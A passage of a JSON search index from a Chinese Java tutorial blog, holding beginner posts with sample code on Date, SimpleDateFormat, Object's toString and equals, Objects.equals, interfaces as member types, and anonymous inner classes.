&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"练习_请使用日期时间相关的API，计算出一个人已经出生了多天","slug":"java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天","date":"2020-03-15T00:00:09.000Z","updated":"2020-03-15T00:01:53.785Z","comments":true,"path":"2020/03/15/java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/15/java00139练习-请使用日期时间相关的API，计算出一个人已经出生了多天/","excerpt":"","text":"练习_请使用日期时间相关的API，计算出一个人已经出生了多天 12345678910111213141516171819202122232425262728293031323334353637package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;import java.util.Scanner;/* 练习: 请使用日期时间相关的API，计算出一个人已经出生了多少天。 分析: 1.使用Scanner类中的方法next,获取出生日期 2.使用DateFormat类中的方法parse,把字符串的出生日期,解析为Date格式的出生日期 3.把Date格式的出生日期转换为毫秒值 4.获取当前的日期,转换为毫秒值 5.使用当前日期的毫秒值-出生日期的毫秒值 6.把毫秒差值转换为天(s/1000/60/60/24) */public class Demo02Test &#123; public static void main(String[] args) throws ParseException &#123; //1.使用Scanner类中的方法next,获取出生日期 Scanner sc = new Scanner(System.in); System.out.println(\"请输入您的出生日期,格式:yyyy-MM-dd\"); String birthdayDateString = sc.next(); //2.使用DateFormat类中的方法parse,把字符串的出生日期,解析为Date格式的出生日期 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd\"); Date birthdayDate = sdf.parse(birthdayDateString); //3.把Date格式的出生日期转换为毫秒值 long birthdayDateTime = birthdayDate.getTime(); //4.获取当前的日期,转换为毫秒值 long todayTime = new Date().getTime(); //5.使用当前日期的毫秒值-出生日期的毫秒值 long time = todayTime-birthdayDateTime; //6.把毫秒差值转换为天(s/1000/60/60/24) System.out.println(time/1000/60/60/24); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java DateFormat类的format方法和parse方法","slug":"java00138DateFormat类的format方法和parse方法","date":"2020-03-14T06:01:01.000Z","updated":"2020-03-14T17:23:35.961Z","comments":true,"path":"2020/03/14/java00138DateFormat类的format方法和parse方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00138DateFormat类的format方法和parse方法/","excerpt":"","text":"java DateFormat类的format方法和parse方法 java.text.DateFormat:是日期/时间格式化子类的抽象类 作用: 格式化（也就是日期 -&gt; 文本）、解析（文本-&gt; 日期） 成员方法: String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date parse(String source) 把符合模式的字符串,解析为Date日期 DateFormat类是一个抽象类,无法直接创建对象使用,可以使用DateFormat类的子类 java.text.SimpleDateFormat extends DateFormat 构造方法: SimpleDateFormat(String pattern) 用给定的模式和默认语言环境的日期格式符号构造 SimpleDateFormat。 参数: String pattern:传递指定的模式 模式:区分大小写的 y 年 M 月 d 日 H 时 m 分 s 秒 写对应的模式,会把模式替换为对应的日期和时间 “yyyy-MM-dd HH:mm:ss” 注意: 模式中的字母不能更改,连接模式的符号可以改变 “yyyy年MM月dd日 HH时mm分ss秒” 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Demo01DateFormat &#123; public static void main(String[] args) throws ParseException &#123; demo02(); &#125; /* 使用DateFormat类中的方法parse,把文本解析为日期 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 注意: public Date parse(String source) throws ParseException parse方法声明了一个异常叫ParseException 如果字符串和构造方法的模式不一样,那么程序就会抛出此异常 调用一个抛出了异常的方法,就必须的处理这个异常,要么throws继续抛出这个异常,要么try catch自己处理 */ private static void demo02() throws ParseException &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 //Date parse(String source) 把符合模式的字符串,解析为Date日期 Date date = sdf.parse(\"2088年08月08日 15时51分54秒\"); System.out.println(date); &#125; /* 使用DateFormat类中的方法format,把日期格式化为文本 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) */ private static void demo01() &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) //String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date date = new Date(); String d = sdf.format(date); System.out.println(date);//Sun Aug 08 15:51:54 CST 2088 System.out.println(d);//2088年08月08日 15时51分54秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java DateFormat类与SimpleDateFormat类介绍","slug":"java00137DateFormat类与SimpleDateFormat类介绍","date":"2020-03-14T00:48:45.000Z","updated":"2020-03-14T00:57:13.679Z","comments":true,"path":"2020/03/14/java00137DateFormat类与SimpleDateFormat类介绍/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00137DateFormat类与SimpleDateFormat类介绍/","excerpt":"","text":"java DateFormat类与SimpleDateFormat类介绍 java.text.DateFormat:是日期/时间格式化子类的抽象类 作用: 格式化（也就是日期 -&gt; 文本）、解析（文本-&gt; 日期） 成员方法: String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date parse(String source) 把符合模式的字符串,解析为Date日期 DateFormat类是一个抽象类,无法直接创建对象使用,可以使用DateFormat类的子类 java.text.SimpleDateFormat extends DateFormat 构造方法: SimpleDateFormat(String pattern) 用给定的模式和默认语言环境的日期格式符号构造 SimpleDateFormat。 参数: String pattern:传递指定的模式 模式:区分大小写的 y 年 M 月 d 日 H 时 m 分 s 秒 写对应的模式,会把模式替换为对应的日期和时间 “yyyy-MM-dd HH:mm:ss” 注意: 模式中的字母不能更改,连接模式的符号可以改变 “yyyy年MM月dd日 HH时mm分ss秒” */ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo03.DateFormat;import java.text.ParseException;import java.text.SimpleDateFormat;import java.util.Date;public class Demo01DateFormat &#123; public static void main(String[] args) throws ParseException &#123; demo02(); &#125; /* 使用DateFormat类中的方法parse,把文本解析为日期 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 注意: public Date parse(String source) throws ParseException parse方法声明了一个异常叫ParseException 如果字符串和构造方法的模式不一样,那么程序就会抛出此异常 调用一个抛出了异常的方法,就必须的处理这个异常,要么throws继续抛出这个异常,要么try catch自己处理 */ private static void demo02() throws ParseException &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法parse,把符合构造方法中模式的字符串,解析为Date日期 //Date parse(String source) 把符合模式的字符串,解析为Date日期 Date date = sdf.parse(\"2088年08月08日 15时51分54秒\"); System.out.println(date); &#125; /* 使用DateFormat类中的方法format,把日期格式化为文本 使用步骤: 1.创建SimpleDateFormat对象,构造方法中传递指定的模式 2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) */ private static void demo01() &#123; //1.创建SimpleDateFormat对象,构造方法中传递指定的模式 SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy年MM月dd日 HH时mm分ss秒\"); //2.调用SimpleDateFormat对象中的方法format,按照构造方法中指定的模式,把Date日期格式化为符合模式的字符串(文本) //String format(Date date) 按照指定的模式,把Date日期,格式化为符合模式的字符串 Date date = new Date(); String d = sdf.format(date); System.out.println(date);//Sun Aug 08 15:51:54 CST 2088 System.out.println(d);//2088年08月08日 15时51分54秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Date类的构造方法和成员方法","slug":"java00136Date类的构造方法和成员方法","date":"2020-03-14T00:41:32.000Z","updated":"2020-03-14T00:46:49.094Z","comments":true,"path":"2020/03/14/java00136Date类的构造方法和成员方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00136Date类的构造方法和成员方法/","excerpt":"","text":"java Date类的构造方法和成员方法 12345678910111213141516171819202122232425262728293031323334353637383940package com.itheima.demo02.Date;import java.util.Date;public class Demo02Date &#123; public static void main(String[] args) &#123; demo03(); &#125; /* long getTime() 把日期转换为毫秒值(相当于System.currentTimeMillis()方法) 返回自 1970 年 1 月 1 日 00:00:00 GMT 以来此 Date 对象表示的毫秒数。 */ private static void demo03() &#123; Date date = new Date(); long time = date.getTime(); System.out.println(time);//3742777636267 &#125; /* Date类的带参数构造方法 Date(long date) :传递毫秒值,把毫秒值转换为Date日期 */ private static void demo02() &#123; Date date = new Date(0L); System.out.println(date);// Thu Jan 01 08:00:00 CST 1970 date = new Date(3742767540068L); System.out.println(date);// Sun Aug 08 09:39:00 CST 2088 &#125; /* Date类的空参数构造方法 Date() 获取当前系统的日期和时间 */ private static void demo01() &#123; Date date = new Date(); System.out.println(date);//Sun Aug 08 12:23:03 CST 2088 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Object与Objects类总结","slug":"java00135Object与Objects类总结","date":"2020-03-14T00:37:43.000Z","updated":"2020-03-18T15:34:55.897Z","comments":true,"path":"2020/03/14/java00135Object与Objects类总结/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00135Object与Objects类总结/","excerpt":"","text":"java Object与Objects类总结 在刚才IDEA自动重写equals代码中，使用到了java.util.Objects类，那么这个类是什么呢？ 在JDK7添加了一个Objects工具类，它提供了一些方法来操作对象，它由一些静态的实用方法组成，这些方法是null-save（空指针安全的）或null-tolerant（容忍空指针的），用于计算对象的hashcode、返回对象的字符串表示形式、比较两个对象。 在比较两个对象的时候，Object的equals方法容易抛出空指针异常，而Objects类中的equals方法就优化了这个问题。方法如下： public static boolean equals(Object a, Object b):判断两个对象是否相等。 我们可以查看一下源码，学习一下： 123public static boolean equals(Object a, Object b) &#123; return (a == b) || (a != null &amp;&amp; a.equals(b)); &#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java毫秒值的概念和作用","slug":"java00134毫秒值的概念和作用","date":"2020-03-13T16:12:30.000Z","updated":"2020-03-13T16:16:30.850Z","comments":true,"path":"2020/03/14/java00134毫秒值的概念和作用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00134毫秒值的概念和作用/","excerpt":"","text":"java毫秒值的概念和作用 java.util.Date: 表示日期和时间的类 类 Date 表示特定的瞬间，精确到毫秒。 毫秒:千分之一秒 1000毫秒=1秒 特定的瞬间:一个时间点,一刹那时间 2088-08-08 09:55:33:333 瞬间 2088-08-08 09:55:33:334 瞬间 2088-08-08 09:55:33:334 瞬间 … 毫秒值的作用: 可以对时间和日期进行计算 2099-01-03 到 2088-01-01 中间一共有多少天 可以日期转换为毫秒进行计算,计算完毕,在把毫秒转换为日期 把日期转换为毫秒: 当前的日期: 2088-01-01 时间原点(0毫秒): 1970 年 1 月 1 日 00:00:00(英国格林威治) 就是计算当前日期到时间原点之间一共经历了多少毫秒 (3742767540068L) 注意: 中国属于东八区,会把时间增加8个小时 1970 年 1 月 1 日 08:00:00 把毫秒转换为日期: 1 天 = 24 × 60 × 60 = 86400 秒 = 86400 x 1000 = 86400000毫秒 1234567package com.itheima.demo02.Date;public class Demo01Date &#123; public static void main(String[] args) &#123; System.out.println(System.currentTimeMillis());//获取当前系统时间到1970 年 1 月 1 日 00:00:00经历了多少毫秒 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java Object类的toString方法","slug":"java00133Object类的toString方法","date":"2020-03-13T16:07:55.000Z","updated":"2020-03-13T16:10:15.376Z","comments":true,"path":"2020/03/14/java00133Object类的toString方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/14/java00133Object类的toString方法/","excerpt":"","text":"java Object类的toString方法 ​ java.lang.Object ​ 类 Object 是类层次结构的根(父)类。 ​ 每个类(Person,Student…)都使用 Object 作为超(父)类。 ​ 所有对象（包括数组）都实现这个类的方法。 12345678910111213141516171819202122232425262728293031323334package com.itheima.demo01.Object;import java.util.ArrayList;import java.util.Random;import java.util.Scanner;public class Demo01ToString&#123; public static void main(String[] args) &#123; /* Person类默认继承了Object类,所以可以使用Object类中的toString方法 String toString() 返回该对象的字符串表示。 */ Person p = new Person(\"张三\",18); String s = p.toString(); System.out.println(s);//com.itheima.demo01.Object.Person@75412c2f | abc | Person&#123;name=张三 ,age=18&#125; //直接打印对象的名字,其实就是调用对象的toString p=p.toString(); System.out.println(p);//com.itheima.demo01.Object.Person@5f150435 | abc | Person&#123;name=张三 ,age=18&#125; //看一个类是否重写了toString,直接打印这个类的对象即可,如果没有重写toString方法那么打印的是对象的地址值 Random r = new Random(); System.out.println(r);//java.util.Random@3f3afe78 没有重写toString方法 Scanner sc = new Scanner(System.in); System.out.println(sc);//java.util.Scanner[delimiters=\\p&#123;javaWhitespace&#125;+.. 重写toString方法 ArrayList&lt;Integer&gt; list = new ArrayList&lt;&gt;(); list.add(1); list.add(2); list.add(3); System.out.println(list);//[1, 2, 3] 重写toString方法 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaObject类的equals方法2","slug":"java00132Object类的equals方法2","date":"2020-03-13T15:59:19.000Z","updated":"2020-03-13T16:05:16.979Z","comments":true,"path":"2020/03/13/java00132Object类的equals方法2/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00132Object类的equals方法2/","excerpt":"","text":"java Object类的equals方法2 1234567boolean b = s1.equals(s2); // NullPointerException null是不能调用方法的,会抛出空指针异常System.out.println(b);//Objects类的equals方法:对两个对象进行比较,防止空指针异常public static boolean equals(Object a, Object b) &#123;return (a == b) || (a != null &amp;&amp; a.equals(b));&#125; 123456789101112131415package com.itheima.demo01.Object;import java.util.Objects;public class Demo03Objects &#123; public static void main(String[] args) &#123; String s1 = \"abc\"; //String s1 = null; String s2 = \"abc\"; boolean b2 = Objects.equals(s1, s2); System.out.println(b2); &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899package com.itheima.demo01.Object;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; /* 直接打印对象的地址值没有意义,需要重写Object类中的toString方法 打印对象的属性(name,age) */ /*@Override public String toString() &#123; //return \"abc\"; return \"Person&#123;name=\"+name+\" ,age=\"+age+\"&#125;\"; &#125;*/ /*@Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;*/ /* Object类的equals方法,默认比较的是两个对象的地址值,没有意义 所以我们要重写equals方法,比较两个对象的属性(name,age) 问题: 隐含着一个多态 多态的弊端:无法使用子类特有的内容(属性和方法) Object obj = p2 = new Person(\"古力娜扎\",19); 解决:可以使用向下转型(强转)把obj类型转换为Person */ /*@Override public boolean equals(Object obj) &#123; //增加一个判断,传递的参数obj如果是this本身,直接返回true,提高程序的效率 if(obj==this)&#123; return true; &#125; //增加一个判断,传递的参数obj如果是null,直接返回false,提高程序的效率 if(obj==null)&#123; return false; &#125; //增加一个判断,防止类型转换一次ClassCastException if(obj instanceof Person)&#123; //使用向下转型,把obj转换为Person类型 Person p = (Person)obj; //比较两个对象的属性,一个对象是this(p1),一个对象是p(obj-&gt;p2) boolean b = this.name.equals(p.name) &amp;&amp; this.age==p.age; return b; &#125; //不是Person类型直接返回false return false; &#125;*/ @Override public boolean equals(Object o) &#123; if (this == o) return true; //getClass() != o.getClass() 使用反射技术,判断o是否是Person类型 等效于 obj instanceof Person if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java重写Object类的equals方法","slug":"java00131重写Object类的equals方法","date":"2020-03-13T15:50:46.000Z","updated":"2020-03-13T15:56:47.356Z","comments":true,"path":"2020/03/13/java00131重写Object类的equals方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00131重写Object类的equals方法/","excerpt":"","text":"java 重写Object类的equals方法 直接打印对象的地址值没有意义,需要重写Object类中的toString方法 打印对象的属性(name,age) 123456789101112@Override public String toString() &#123; //return \"abc\"; return \"Person&#123;name=\"+name+\" ,age=\"+age+\"&#125;\"; &#125; @Override public String toString() &#123; return \"Person&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125; Object类的equals方法,默认比较的是两个对象的地址值,没有意义 所以我们要重写equals方法,比较两个对象的属性(name,age) 问题: 隐含着一个多态 多态的弊端:无法使用子类特有的内容(属性和方法) Object obj = p2 = new Person(&quot;古力娜扎&quot;,19); 解决:可以使用向下转型(强转)把obj类型转换为Person 1234567891011121314151617181920212223@Override public boolean equals(Object obj) &#123; //增加一个判断,传递的参数obj如果是this本身,直接返回true,提高程序的效率 if(obj==this)&#123; return true; &#125; //增加一个判断,传递的参数obj如果是null,直接返回false,提高程序的效率 if(obj==null)&#123; return false; &#125; //增加一个判断,防止类型转换一次ClassCastException if(obj instanceof Person)&#123; //使用向下转型,把obj转换为Person类型 Person p = (Person)obj; //比较两个对象的属性,一个对象是this(p1),一个对象是p(obj-&gt;p2) boolean b = this.name.equals(p.name) &amp;&amp; this.age==p.age; return b; &#125; //不是Person类型直接返回false return false; &#125; 1234567891011121314151617181920212223242526272829303132333435package com.itheima.demo01.Object;import java.util.ArrayList;public class Demo02Equals &#123; public static void main(String[] args) &#123; /* Person类默认继承了Object类,所以可以使用Object类的equals方法 boolean equals(Object obj) 指示其他某个对象是否与此对象“相等”。 equals方法源码: public boolean equals(Object obj) &#123; return (this == obj); &#125; 参数: Object obj:可以传递任意的对象 == 比较运算符,返回的是一个布尔值 true false 基本数据类型:比较的是值 引用数据类型:比价的是两个对象的地址值 this是谁?那个对象调用的方法,方法中的this就是那个对象;p1调用的equals方法所以this就是p1 obj是谁?传递过来的参数p2 this==obj --&gt;p1==p2 */ Person p1 = new Person(\"迪丽热巴\",18); //Person p2 = new Person(\"古力娜扎\",19); Person p2 = new Person(\"迪丽热巴\",18); System.out.println(\"p1:\"+p1);//p1:com.itheima.demo01.Object.Person@58ceff1 System.out.println(\"p2:\"+p2);//p2:com.itheima.demo01.Object.Person@7c30a502 //p1=p2;//把p2的地址值赋值给p1 ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); boolean b = p1.equals(p1); System.out.println(b); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.itheima.demo01.Object;import java.util.Objects;public class Person &#123; private String name; private int age; public Person() &#123; &#125; public Person(String name, int age) &#123; this.name = name; this.age = age; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; //getClass() != o.getClass() 使用反射技术,判断o是否是Person类型 等效于 obj instanceof Person if (o == null || getClass() != o.getClass()) return false; Person person = (Person) o; return age == person.age &amp;&amp; Objects.equals(name, person.name); &#125; @Override public int hashCode() &#123; return Objects.hash(name, age); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"javaObject类的equals方法","slug":"java00130Object类的equals方法","date":"2020-03-13T15:44:22.000Z","updated":"2020-03-13T15:49:42.885Z","comments":true,"path":"2020/03/13/java00130Object类的equals方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00130Object类的equals方法/","excerpt":"","text":"java Object类的equals方法 Person类默认继承了Object类,所以可以使用Object类的equals方法 boolean equals(Object obj) 指示其他某个对象是否与此对象“相等”。 equals方法源码: 123public boolean equals(Object obj) &#123;return (this == obj);&#125; 参数: Object obj:可以传递任意的对象 ==比较运算符,返回的是一个布尔值true false 基本数据类型:比较的是值 引用数据类型:比价的是两个对象的地址值 this是谁?那个对象调用的方法,方法中的this就是那个对象;p1调用的equals方法所以this就是p1 obj是谁?传递过来的参数p2 this==obj --&gt;p1==p2 1234567891011121314151617181920package com.itheima.demo01.Object;import java.util.ArrayList;public class Demo02Equals &#123; public static void main(String[] args) &#123; Person p1 = new Person(\"迪丽热巴\",18); //Person p2 = new Person(\"古力娜扎\",19); Person p2 = new Person(\"迪丽热巴\",18); System.out.println(\"p1:\"+p1);//p1:com.itheima.demo01.Object.Person@58ceff1 System.out.println(\"p2:\"+p2);//p2:com.itheima.demo01.Object.Person@7c30a502 //p1=p2;//把p2的地址值赋值给p1 ArrayList&lt;String&gt; list = new ArrayList&lt;&gt;(); boolean b = p1.equals(p1); System.out.println(b); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口作为成员变量类型","slug":"java00128接口作为成员变量类型","date":"2020-03-13T13:34:28.000Z","updated":"2020-03-13T13:38:28.209Z","comments":true,"path":"2020/03/13/java00128接口作为成员变量类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00128接口作为成员变量类型/","excerpt":"","text":"java接口作为成员变量类型 1234567891011121314151617181920212223242526272829303132package cn.itcast.day11.demo07;public class DemoGame &#123; public static void main(String[] args) &#123; Hero hero = new Hero(); hero.setName(\"艾希\"); // 设置英雄的名称 // 设置英雄技能// hero.setSkill(new SkillImpl()); // 使用单独定义的实现类 // 还可以改成使用匿名内部类// Skill skill = new Skill() &#123;// @Override// public void use() &#123;// System.out.println(\"Pia~pia~pia~\");// &#125;// &#125;;// hero.setSkill(skill); // 进一步简化，同时使用匿名内部类和匿名对象 hero.setSkill(new Skill() &#123; @Override public void use() &#123; System.out.println(\"Biu~Pia~Biu~Pia~\"); &#125; &#125;); hero.attack(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940package cn.itcast.day11.demo07;public class Hero &#123; private String name; // 英雄的名称 //使用接口作为成员变量类型 private Skill skill; // 英雄的技能 public Hero() &#123; &#125; public Hero(String name, Skill skill) &#123; this.name = name; this.skill = skill; &#125; public void attack() &#123; System.out.println(\"我叫\" + name + \"，开始施放技能：\"); skill.use(); // 调用接口中的抽象方法 System.out.println(\"施放技能完成。\"); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Skill getSkill() &#123; return skill; &#125; public void setSkill(Skill skill) &#123; this.skill = skill; &#125;&#125; 1234567package cn.itcast.day11.demo07;public interface Skill &#123; void use(); // 释放技能的抽象方法&#125; 12345678package cn.itcast.day11.demo07;public class SkillImpl implements Skill &#123; @Override public void use() &#123; System.out.println(\"Biu~biu~biu~\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口作为方法的参数和或返回值","slug":"java00129接口作为方法的参数和或返回值","date":"2020-03-13T13:34:28.000Z","updated":"2020-03-13T13:44:50.090Z","comments":true,"path":"2020/03/13/java00129接口作为方法的参数和或返回值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00129接口作为方法的参数和或返回值/","excerpt":"","text":"java接口作为方法的参数和或返回值 1234567891011121314151617181920212223242526272829package cn.itcast.day11.demo07;import java.util.ArrayList;import java.util.List;/*java.util.List正是ArrayList所实现的接口。 */public class DemoInterface &#123; public static void main(String[] args) &#123; // 左边是接口名称，右边是实现类名称，这就是多态写法 List&lt;String&gt; list = new ArrayList&lt;&gt;(); List&lt;String&gt; result = addNames(list); for (int i = 0; i &lt; result.size(); i++) &#123; System.out.println(result.get(i)); &#125; &#125; public static List&lt;String&gt; addNames(List&lt;String&gt; list) &#123; list.add(\"迪丽热巴\"); list.add(\"古力娜扎\"); list.add(\"玛尔扎哈\"); list.add(\"沙扬娜拉\"); return list; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java类作为成员变量类型","slug":"java00127类作为成员变量类型","date":"2020-03-13T13:31:16.000Z","updated":"2020-03-13T13:33:24.331Z","comments":true,"path":"2020/03/13/java00127类作为成员变量类型/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00127类作为成员变量类型/","excerpt":"","text":"java类作为成员变量类型 123456789101112131415161718192021package cn.itcast.day11.demo06;public class DemoMain &#123; public static void main(String[] args) &#123; // 创建一个英雄角色 Hero hero = new Hero(); // 为英雄起一个名字，并且设置年龄 hero.setName(\"盖伦\"); hero.setAge(20); // 创建一个武器对象 Weapon weapon = new Weapon(\"AK-47\"); // 为英雄配备武器 hero.setWeapon(weapon); // 年龄为20的盖伦用多兰剑攻击敌方。 hero.attack(); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package cn.itcast.day11.demo06;// 游戏当中的英雄角色类public class Hero &#123; private String name; // 英雄的名字 private int age; // 英雄的年龄 private Weapon weapon; // 英雄的武器 public Hero() &#123; &#125; public Hero(String name, int age, Weapon weapon) &#123; this.name = name; this.age = age; this.weapon = weapon; &#125; public void attack() &#123; System.out.println(\"年龄为\" + age + \"的\" + name + \"用\" + weapon.getCode() + \"攻击敌方。\"); &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public Weapon getWeapon() &#123; return weapon; &#125; public void setWeapon(Weapon weapon) &#123; this.weapon = weapon; &#125;&#125; 123456789101112131415161718192021package cn.itcast.day11.demo06;public class Weapon &#123; private String code; // 武器的代号 public Weapon() &#123; &#125; public Weapon(String code) &#123; this.code = code; &#125; public String getCode() &#123; return code; &#125; public void setCode(String code) &#123; this.code = code; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java匿名内部类的注意事项","slug":"java00126匿名内部类的注意事项","date":"2020-03-13T13:27:51.000Z","updated":"2020-03-13T13:31:48.800Z","comments":true,"path":"2020/03/13/java00126匿名内部类的注意事项/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00126匿名内部类的注意事项/","excerpt":"","text":"java匿名内部类的注意事项 对格式“new 接口名称() {…}”进行解析： new代表创建对象的动作 接口名称就是匿名内部类需要实现哪个接口 {…}这才是匿名内部类的内容 另外还要注意几点问题： 匿名内部类，在【创建对象】的时候，只能使用唯一一次。 如果希望多次创建对象，而且类的内容一样的话，那么就需要使用单独定义的实现类了。 匿名对象，在【调用方法】的时候，只能调用唯一一次。 如果希望同一个对象，调用多次方法，那么必须给对象起个名字。 匿名内部类是省略了【实现类/子类名称】，但是匿名对象是省略了【对象名称】 强调：匿名内部类和匿名对象不是一回事！！！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package cn.itcast.day11.demo05;public class DemoMain &#123; public static void main(String[] args) &#123;// MyInterface obj = new MyInterfaceImpl();// obj.method();// MyInterface some = new MyInterface(); // 错误写法！ // 使用匿名内部类，但不是匿名对象，对象名称就叫objA MyInterface objA = new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-A\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-A\"); &#125; &#125;; objA.method1(); objA.method2(); System.out.println(\"=================\"); // 使用了匿名内部类，而且省略了对象名称，也是匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method1(); // 因为匿名对象无法调用第二次方法，所以需要再创建一个匿名内部类的匿名对象 new MyInterface() &#123; @Override public void method1() &#123; System.out.println(\"匿名内部类实现了方法！111-B\"); &#125; @Override public void method2() &#123; System.out.println(\"匿名内部类实现了方法！222-B\"); &#125; &#125;.method2(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java匿名内部类","slug":"java00125匿名内部类","date":"2020-03-13T13:23:16.000Z","updated":"2020-03-13T13:27:21.360Z","comments":true,"path":"2020/03/13/java00125匿名内部类/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/13/java00125匿名内部类/","excerpt":"","text":"如果接口的实现类（或者是父类的子类）只需要使用唯一的一次， 